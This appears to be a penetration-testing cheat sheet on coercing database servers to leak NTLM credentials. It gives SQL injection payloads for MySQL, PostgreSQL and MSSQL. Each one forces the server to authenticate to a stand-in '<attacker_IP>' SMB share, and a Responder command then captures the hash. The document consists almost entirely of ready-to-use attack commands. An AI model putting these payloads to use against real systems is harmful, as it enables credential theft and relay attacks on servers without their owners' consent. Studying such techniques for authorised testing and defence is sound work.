# 02 - DBMS Backend Relay Attack

Search Tag(s): #mitm #responder #smb #relay #ntlm #sql-injection

## 2.1 - MySQL

```
SELECT LOAD_FILE('\\\\<attacker_IP>\\snare\')
```

## 2.2 - PostgreSQL

```
CREATE TABLE test_table(test_column TEXT);
COPY test_table(test_column) FROM '\\\\<attacker_IP>\\snare\';
DROP TABLE test_table;
```

## 2.3 - MSSQL

```
1> xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_subdirs '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_fileexist '\\<attacker_IP>\snare\'
2> go
```

- Capture hash

`$ sudo responder -I <interface>`

---
## References

- [Pwning a Shell via MSSQL DBMS](https://owasp.org/www-chapter-ghana/assets/slides/Pwning_a_shell_via_MSSQL_DBMS.pdf)

- [Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)